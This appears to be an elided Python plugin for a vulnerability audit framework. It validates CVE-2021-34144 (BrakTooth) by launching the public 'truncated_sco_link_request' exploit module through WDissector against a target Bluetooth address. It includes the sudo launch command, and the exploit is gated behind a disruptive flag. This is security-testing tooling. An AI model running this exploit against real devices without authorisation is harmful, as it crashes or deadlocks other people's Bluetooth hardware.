#!/usr/bin/env python3
"""CVE-2021-34144 – BrakTooth BT Classic: Truncated SCO Link Request – Jieli AC6366C crash via truncated SCO req.

Public PoC source: https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks
  Attack module: truncated_sco_link_request
  Target chip: Zhuhai Jieli AC6366C
...
Usage:
  Load exploit module "truncated_sco_link_request" via WDissector:
    sudo ./wdissector --exploit=truncated_sco_link_request --target=<bdaddr>
"""
...
VULN = {
    ...
    "year": 2021,
    "domain": "wireless",
    "vendor_product": "Zhuhai Jieli AC6366C Bluetooth Classic SoC",
    "component": "Bluetooth Classic LMP / HCI stack",
    "type": "BT Classic protocol attack → DoS / crash / RCE",
    "summary": "Truncated SCO Link Request – Jieli AC6366C crash via truncated SCO req",
...
def _run_poc(plugin):
    ...
    evidence = {
        "cve": "CVE-2021-34144",
        "braktooth_module": "truncated_sco_link_request",
        "target_chip": "Zhuhai Jieli AC6366C",
        ...
        "attack_surface": "Zhuhai Jieli AC6366C BT SoC truncated SCO link request → deadlock",
    }
    ...
    if allow_disruptive and target:
        ...
        cmd[1] = f"--exploit=truncated_sco_link_request"
    ...
    return {
        ...
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "Matheus-Garbelini/braktooth / module: truncated_sco_link_request",
    }


_module = "truncated_sco_link_request"  # exploit module name
try:
...
class Poc112CVE202134144BrakToothBtClassicAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-WIRELESS-112"
    meta_poc_name   = 'CVE-2021-34144 BrakTooth AC6366C Truncated SCO Request Active Validation'
    meta_cve_id     = "CVE-2021-34144"
    meta_severity   = "High"
    ...
    meta_attack_surface = "Zhuhai Jieli AC6366C BT SoC truncated SCO link request → deadlock"
    is_disruptive   = True
...
if __name__ == "__main__":
    ...
    _desc = VULN.get("summary", "112_Truncated_SCO_Link_Request__Jieli_AC636_Audit") if "VULN" in dir() else "112_Truncated_SCO_Link_Request__Jieli_AC636_Audit"
    ...
    _plugin = Poc112CVE202134144BrakToothBtClassicAuditPlugin({
